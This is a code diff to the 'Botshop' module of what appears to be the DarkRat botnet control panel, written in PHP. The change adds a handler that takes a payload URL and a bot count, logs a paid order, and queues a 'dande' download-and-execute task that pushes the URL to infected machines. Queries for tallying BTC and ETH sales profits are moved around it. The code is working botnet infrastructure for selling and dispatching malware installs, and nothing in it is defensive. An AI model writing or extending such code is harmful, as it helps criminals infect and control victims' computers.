@@ -47,18 +47,9 @@ class Botshop{
         if(empty($_SESSION["darkrat_userid"])) {
             die("Login Required");
         }
-        $GLOBALS["template"][1] = "options";
 
-        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'btc'  Then botshop_orders.coinstopay Else 0 End ) as profit_btc,
-SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'eth'  Then botshop_orders.coinstopay Else 0 End ) as profit_eth,
- botshop_access.apikey, botshop_access.id, users.username 
-                                                         FROM botshop_access 
-                                                         LEFT JOIN users ON users.id = botshop_access.created_by_userid 
-                                                         LEFT JOIN botshop_orders ON botshop_orders.from_access_api = botshop_access.apikey
-                                                          WHERE botshop_access.active = ? group by botshop_access.apikey");
-        $statementConfig->execute(array(1));
-        $botshopAccessList = $statementConfig->fetchAll();
-        $GLOBALS["tpl"]->assign("botshopAccessList", $botshopAccessList);
+
+        $GLOBALS["template"][1] = "options";
 
 
         if(!empty($_POST["create_new_shop_api"])){
@@ -70,6 +61,58 @@ SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'eth'  Then botsh
             $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM botshop_access WHERE id = ?");
             $statement->execute(array($_POST["deleteapi"]));
         }
+
+        if(!empty($_POST["use_api"])){
+            if(empty($_POST["amount"])){
+               die("Empty Load Amount");
+            }
+            if(empty($_POST["loadurl"])){
+               die("Empty Load URL");
+            }
+
+            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
+            $statement->execute(array($_POST["use_api"]));
+            $apidetails = $statement->fetch();
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
+            $statement->execute(array("custom", "", "", "", "", $_POST["amount"],$_POST["loadurl"],$_POST["frontend_user"],$apidetails["apikey"]));
+            $orderId = $GLOBALS["pdo"]->lastInsertId();
+
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
+            $statement->execute(array('[]', 0, 'dande', $_POST["loadurl"], $_POST["amount"]));
+            $taskid = $GLOBALS["pdo"]->lastInsertId();
+
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE id = ?");
+            $statement->execute(array(1, $taskid, $orderId));
+
+        }
+
+
+        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'btc'  Then botshop_orders.coinstopay Else 0 End ) as profit_btc,
+SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'eth'  Then botshop_orders.coinstopay Else 0 End ) as profit_eth,
+ botshop_access.apikey, botshop_access.id, users.username 
+                                                         FROM botshop_access 
+                                                         LEFT JOIN users ON users.id = botshop_access.created_by_userid 
+                                                         LEFT JOIN botshop_orders ON botshop_orders.from_access_api = botshop_access.apikey
+                                                          WHERE botshop_access.active = ? group by botshop_access.apikey");
+        $statementConfig->execute(array(1));
+        $botshopAccessList = $statementConfig->fetchAll();
+
+
+
+        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access ");
+        $statement->execute(array());
+        $access_apis = array();
+        while($row = $statement->fetch()) {
+            $access_apis[] = $row;
+        }
+
+
+
+
+        $GLOBALS["tpl"]->assign("botshopAccessList", $botshopAccessList);
+        $GLOBALS["tpl"]->assign("access_apis", $access_apis);
+        $GLOBALS["tpl"]->assign("frontend_user", md5($this->random_string()));
+
     }
 
     public function editapi($id){
